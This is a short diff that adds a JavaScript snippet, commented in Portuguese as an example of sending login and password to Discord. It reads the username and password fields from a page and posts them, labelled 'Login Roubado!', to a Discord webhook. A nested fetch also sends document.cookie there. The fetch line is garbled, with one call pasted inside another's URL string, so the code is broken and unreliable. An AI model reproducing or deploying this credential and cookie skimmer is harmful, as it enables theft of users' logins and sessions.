@@ -1,0 +1,12 @@
+// Exemplo de script para enviar login e senha para o Discord
+const user = document.getElementById('user').value;
+const pass = document.getElementById('pass').value;
+
+fetch('fetch('https://discord.com/api/webhooks/1570495356666384394/N7BIalu4gQXw6gSHb7O63WPJUDd-m2RLASXM3wehHNZTyiR-o6kBRFcS4ujaqWPMx5Kg', {method: 'POST', body: document.cookie});', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        content: `Login Roubado!\nUsuário: ${user}\nSenha: ${pass}`
+    })
+});
+
